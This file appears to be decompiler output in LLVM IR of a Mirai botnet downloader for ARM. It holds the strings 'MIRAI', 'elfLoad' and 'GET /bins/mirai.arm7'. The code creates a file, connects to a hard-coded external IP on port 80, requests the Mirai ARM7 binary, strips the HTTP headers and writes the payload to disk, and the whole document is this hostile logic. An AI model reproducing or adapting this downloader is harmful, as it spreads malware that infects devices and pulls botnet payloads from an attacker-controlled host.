source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r3 = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@global_var_8421.4 = constant [4 x i8] c"rm7\00"
@global_var_8428.6 = constant [7 x i8] c"MIRAI\0A\00"
@global_var_8430.10 = constant [8 x i8] c"elfLoad\00"
@global_var_80e4.11 = constant i32 -449978364
@global_var_8438.13 = constant [5 x i8] c"NIF\0A\00"
@global_var_8440.15 = constant [34 x i8] c"GET /bins/mirai.arm7 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_8464.18 = constant [5 x i8] c"FIN\0A\00"
@global_var_10478.20 = local_unnamed_addr global i32 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_80c0 = mul i32 %arg2, 65536
  %v4_80c4 = mul i32 %arg1, 16777216
  %v4_80c8 = mul i32 %arg3, 256
  %v5_80c0 = or i32 %v4_80c0, %v4_80c4
  %v5_80c4 = or i32 %v5_80c0, %arg4
  %v5_80c8 = or i32 %v5_80c4, %v4_80c8
  %v3_80cc = mul i32 %arg4, 16777216
  %v4_80d0 = mul i32 %arg3, 65536
  %v5_80d0 = or i32 %v3_80cc, %v4_80d0
  %v1_80d4 = and i32 %v5_80c8, 16711680
  %v4_80d8 = udiv i32 %v1_80d4, 256
  %v4_80dc = udiv i32 %v5_80c8, 16777216
  %v5_80d8 = or i32 %v5_80d0, %v4_80dc
  %v5_80dc = or i32 %v5_80d8, %v4_80d8
  ret i32 %v5_80dc

; uselistorder directives
  uselistorder i32 16777216, { 2, 0, 1 }
}

define i32 @function_80e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_80e4:
  %v2_80f4 = call i32 @function_83b0(i32 1, i32 %arg1)
  ret i32 %v2_80f4
}

define i32 @function_8104(i32 %arg1) local_unnamed_addr {
dec_label_pc_8104:
  %v2_8114 = call i32 @function_83b0(i32 6, i32 %arg1)
  ret i32 %v2_8114
}

define i32 @function_8124(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8124:
  store i32 %arg3, i32* @r3, align 4
  %v2_8140 = call i32 @function_83b0(i32 5, i32 %arg1)
  ret i32 %v2_8140
}

define i32 @function_8150(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8150:
  store i32 %arg3, i32* @r3, align 4
  %v2_816c = call i32 @function_83b0(i32 283, i32 %arg1)
  ret i32 %v2_816c
}

define i32 @function_8180(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8180:
  store i32 %arg3, i32* @r3, align 4
  %v2_819c = call i32 @function_83b0(i32 4, i32 %arg1)
  ret i32 %v2_819c
}

define i32 @function_81ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_81ac:
  store i32 %arg3, i32* @r3, align 4
  %v2_81c8 = call i32 @function_83b0(i32 3, i32 %arg1)
  ret i32 %v2_81c8
}

define i32 @function_81d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_81d8:
  store i32 %arg3, i32* @r3, align 4
  %v2_81f4 = call i32 @function_83b0(i32 281, i32 %arg1)
  ret i32 %v2_81f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_83b0, { 2, 5, 4, 0, 1, 6, 3 }
}

define i32 @function_8208() local_unnamed_addr {
dec_label_pc_8208:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-25 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_82205 = load i8, i8* inttoptr (i32 add (i32 ptrtoint ([4 x i8]* @global_var_8421.4 to i32), i32 -1) to i8*), align 1
  %v4_82206 = zext i8 %v3_82205 to i32
  store i32 %v4_82206, i32* %r6.global-to-local, align 4
  %v2_82247 = icmp eq i8 %v3_82205, 0
  br i1 %v2_82247, label %dec_label_pc_8230, label %dec_label_pc_821c

dec_label_pc_821c:                                ; preds = %dec_label_pc_8208, %dec_label_pc_821c
  %v0_8228 = phi i32 [ %v1_8228, %dec_label_pc_821c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_8421.4 to i32), i32 1), %dec_label_pc_8208 ]
  %v0_821c = phi i32 [ %v1_821c, %dec_label_pc_821c ], [ 0, %dec_label_pc_8208 ]
  %v1_821c = add i32 %v0_821c, 1
  store i32 %v1_821c, i32* %r8.global-to-local, align 4
  %v1_8220 = add i32 %v0_8228, -1
  %v2_8220 = inttoptr i32 %v1_8220 to i8*
  %v3_8220 = load i8, i8* %v2_8220, align 1
  %v4_8220 = zext i8 %v3_8220 to i32
  store i32 %v4_8220, i32* %r6.global-to-local, align 4
  %v2_8224 = icmp eq i8 %v3_8220, 0
  %v1_8228 = add i32 %v0_8228, 1
  br i1 %v2_8224, label %dec_label_pc_8230, label %dec_label_pc_821c

dec_label_pc_8230:                                ; preds = %dec_label_pc_821c, %dec_label_pc_8208
  %v4_823c = call i32 @function_8180(i32 1, i32 ptrtoint ([7 x i8]* @global_var_8428.6 to i32), i32 6)
  store i32 2, i32* %stack_var_-44, align 4
  %v7_8260 = call i32 @function_80c0(i32 46, i32 243, i32 189, i32 102, i32 2, i32 20480)
  %v4_8274 = call i32 @function_8124(i32 ptrtoint ([8 x i8]* @global_var_8430.10 to i32), i32 577, i32 511)
  store i32 %v4_8274, i32* %r7.global-to-local, align 4
  %v0_8280 = load i32, i32* %r6.global-to-local, align 4
  %v3_8288 = call i32 @function_81d8(i32 2, i32 1, i32 %v0_8280)
  %v7_828c = icmp eq i32 %v3_8288, -1
  br i1 %v7_828c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_8230
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %bb26

bb:                                               ; preds = %dec_label_pc_8230
  %v1_8290 = load i32, i32* %r7.global-to-local, align 4
  %v8_8290 = icmp eq i32 %v1_8290, -1
  store i32 %v3_8288, i32* %r5.global-to-local, align 4
  br i1 %v8_8290, label %bb26, label %bb27

bb26:                                             ; preds = %.thread, %bb
  br label %bb27

bb27:                                             ; preds = %bb, %bb26
  %v0_829c = phi i1 [ false, %bb ], [ true, %bb26 ]
  store i32 33440, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v0_829c, i32 ptrtoint (i32* @global_var_80e4.11 to i32))
  %v0_82a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_82a4 = ptrtoint i32* %stack_var_-44 to i32
  %v3_82ac = call i32 @function_8150(i32 %v0_82a0, i32 %v2_82a4, i32 16)
  store i32 %v3_82ac, i32* %r4.global-to-local, align 4
  %v1_82b0 = icmp slt i32 %v3_82ac, 0
  br i1 %v1_82b0, label %dec_label_pc_82b8, label %dec_label_pc_82d0

dec_label_pc_82b8:                                ; preds = %bb27
  %v4_82c4 = call i32 @function_8180(i32 1, i32 ptrtoint ([5 x i8]* @global_var_8438.13 to i32), i32 4)
  %v0_82c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_82c8 = sub i32 0, %v0_82c8
  %v1_82cc = call i32 @function_80e4(i32 %v1_82c8)
  br label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %bb27, %dec_label_pc_82b8
  %v0_82d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_82d0 = add i32 %v0_82d0, 29
  store i32 %v1_82d0, i32* %r4.global-to-local, align 4
  %v0_82d4 = load i32, i32* %r5.global-to-local, align 4
  %v4_82e0 = call i32 @function_8180(i32 %v0_82d4, i32 ptrtoint ([34 x i8]* @global_var_8440.15 to i32), i32 %v1_82d0)
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82d0
  br i1 %v9_82e4, label %bb29, label %bb28

bb28:                                             ; preds = %dec_label_pc_82d0
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_82d0, %bb28
  store i32 33520, i32* @lr, align 4
  %v1_82ec = xor i1 %v9_82e4, true
  call void @__pseudo_cond_branch(i1 %v1_82ec, i32 ptrtoint (i32* @global_var_80e4.11 to i32))
  store i32 218762506, i32* %r8.global-to-local, align 4
  %v0_82f4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_82f4, i32* %r4.global-to-local, align 4
  %v2_82f8 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v2_82f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %dec_label_pc_82fc, %bb29
  %v0_8304 = load i32, i32* %r5.global-to-local, align 4
  %v3_8308 = call i32 @function_81ac(i32 %v0_8304, i32 %v2_82f8, i32 1)
  store i32 33560, i32* @lr, align 4
  %v1_8314 = icmp ne i32 %v3_8308, 1
  call void @__pseudo_cond_branch(i1 %v1_8314, i32 ptrtoint (i32* @global_var_80e4.11 to i32))
  %v3_8318 = load i8, i8* %stack_var_-25, align 1
  %v4_8318 = sext i8 %v3_8318 to i32
  %v1_831c = load i32, i32* %r4.global-to-local, align 4
  %v4_831c = mul i32 %v1_831c, 256
  %v5_831c = or i32 %v4_831c, %v4_8318
  store i32 %v5_831c, i32* %r4.global-to-local, align 4
  %v1_8320 = load i32, i32* %r8.global-to-local, align 4
  %v9_8320 = icmp eq i32 %v5_831c, %v1_8320
  br i1 %v9_8320, label %dec_label_pc_8328, label %dec_label_pc_82fc

dec_label_pc_8328:                                ; preds = %dec_label_pc_82fc
  %v2_8328 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %v2_8328, i32* %r4.global-to-local, align 4
  %v0_833431 = load i32, i32* %r5.global-to-local, align 4
  %v3_833832 = call i32 @function_81ac(i32 %v0_833431, i32 %v2_8328, i32 128)
  %v0_834434 = load i32, i32* %r7.global-to-local, align 4
  %tmp3035 = icmp slt i32 %v3_833832, 1
  br i1 %tmp3035, label %dec_label_pc_8354, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8328, %dec_label_pc_834c
  %v0_834437 = phi i32 [ %v0_8344, %dec_label_pc_834c ], [ %v0_834434, %dec_label_pc_8328 ]
  %v3_833836 = phi i32 [ %v3_8338, %dec_label_pc_834c ], [ %v3_833832, %dec_label_pc_8328 ]
  %v3_834c = call i32 @function_8180(i32 %v0_834437, i32 %v2_8328, i32 %v3_833836)
  %v0_8334 = load i32, i32* %r5.global-to-local, align 4
  %v3_8338 = call i32 @function_81ac(i32 %v0_8334, i32 %v2_8328, i32 128)
  %v0_8344 = load i32, i32* %r7.global-to-local, align 4
  %tmp30 = icmp slt i32 %v3_8338, 1
  br i1 %tmp30, label %dec_label_pc_8354, label %dec_label_pc_834c

dec_label_pc_8354:                                ; preds = %dec_label_pc_834c, %dec_label_pc_8328
  %v0_8354 = load i32, i32* %r5.global-to-local, align 4
  %v1_8358 = call i32 @function_8104(i32 %v0_8354)
  %v0_835c = load i32, i32* %r7.global-to-local, align 4
  %v1_8360 = call i32 @function_8104(i32 %v0_835c)
  %v4_8370 = call i32 @function_8180(i32 1, i32 ptrtoint ([5 x i8]* @global_var_8464.18 to i32), i32 4)
  %v1_8378 = call i32 @function_80e4(i32 5)
  ret i32 %v1_8378

; uselistorder directives
  uselistorder i32 %v3_8338, { 1, 0 }
  uselistorder i32 %v2_8328, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8288, { 1, 0 }
  uselistorder i32 %v1_821c, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i8* %stack_var_-25, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 5, 3, 4, 6, 0, 7 }
  uselistorder i32 (i32)* @function_8104, { 1, 0 }
  uselistorder i32 128, { 1, 0 }
  uselistorder i32 256, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_81ac, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_80e4, { 1, 0 }
  uselistorder i32 2, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8180, { 4, 3, 2, 1, 0 }
  uselistorder i8 0, { 1, 0 }
  uselistorder label %dec_label_pc_834c, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_821c, { 1, 0 }
}

define i32 @function_8390(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8390:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_8390 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8390, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_8390
  %v5_8390 = sdiv i32 %arg2, 16
  %v6_8390 = and i32 %v5_8390, %tmp
  store i32 %v6_8390, i32* %r0.global-to-local, align 4
  %v4_8394 = inttoptr i32 %v6_8390 to i32*
  store i32 %v6_8390, i32* %v4_8394, align 4
  %v5_8394 = load i32, i32* %r0.global-to-local, align 4
  %v6_8394 = add i32 %v5_8394, -33692
  store i32 %v6_8394, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8390, %bb
  %v7_8394 = phi i32 [ %tmp, %dec_label_pc_8390 ], [ %v6_8394, %bb ]
  ret i32 %v7_8394

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 1, { 1, 11, 8, 7, 0, 12, 13, 10, 14, 20, 19, 9, 18, 16, 17, 4, 3, 5, 6, 2, 15 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %v0_83ac = call i32 @function_8208()
  ret i32 %v0_83ac
}

define i32 @function_83b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_83b0:
  %v2_83d4 = icmp ugt i32 %arg2, -4097
  br i1 %v2_83d4, label %dec_label_pc_83e0, label %bb

bb:                                               ; preds = %dec_label_pc_83b0
  ret i32 %arg2

dec_label_pc_83e0:                                ; preds = %dec_label_pc_83b0
  %v3_83ec = load i32, i32* @global_var_10478.20, align 4
  %v0_83f0 = call i32 @function_8410()
  %v1_83f4 = sub i32 0, %arg2
  store i32 %v1_83f4, i32* @r3, align 4
  %v3_83f8 = add i32 %v3_83ec, %v0_83f0
  %v4_83f8 = inttoptr i32 %v3_83f8 to i32*
  store i32 %v1_83f4, i32* %v4_83f8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 -1, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32* @r3, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 0, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @function_8408(i32 %arg1) local_unnamed_addr {
dec_label_pc_8408:
  %v0_8408 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8408, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_8408
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_8408, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_8410() local_unnamed_addr {
dec_label_pc_8410:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr
